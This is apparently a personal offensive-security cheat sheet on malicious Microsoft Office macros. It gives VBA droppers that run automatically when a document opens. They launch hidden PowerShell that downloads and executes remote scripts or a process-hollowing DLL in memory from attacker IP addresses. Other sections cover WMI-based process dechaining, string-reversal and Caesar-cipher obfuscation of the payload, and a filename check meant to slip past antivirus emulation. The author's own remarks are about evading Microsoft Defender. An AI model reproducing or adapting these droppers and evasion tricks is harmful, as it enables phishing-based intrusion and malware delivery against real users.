# Reflective Code Execution in Client Side Attacks

### Microsoft Word/Excel use VBA

*** Flagged cause of Powershell command.  Basic VBA dropper ***


### This is reflective poewrshell.  This should download ps1 and run it in memory but this gets flagged.  

``` VBA

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.50.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


######################### OR ############################################ 


Sub MyMacro()
    Dim str As String
    str = "powershell.exe $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.196:4443/DLL_process_hollow.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType('ReflectiveDLLCSharp.Class1'); $method = $class.GetMethod('runner');$method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

<br><br><br><br><br>


## Using WMIPRVSE.exe to DECHAIN from powershell

```  VBA

Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub

```


## Obfuscation methods

**Reverse string** 

``` VBA

Function bears(cows)
    bears = StrReverse(cows)
End Function

```

**Ceaser Cipher (This didnt work for MS Defender)**
<br><br>
Use powershell to encode the text as decimal<br>

``` powershell

$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip

```
<br><br>

**Only run macro if filename matches intended filename.  Sometimes antivirus renamems the file for emulation**
<br><br>

``` VBA

Sub MyMacro()

If ActiveDocument.Name = Nuts("085128116066063117128116126") Then
**PUT MACRO CODE UNDER ABOVE LINE**
End If

end Sub

```

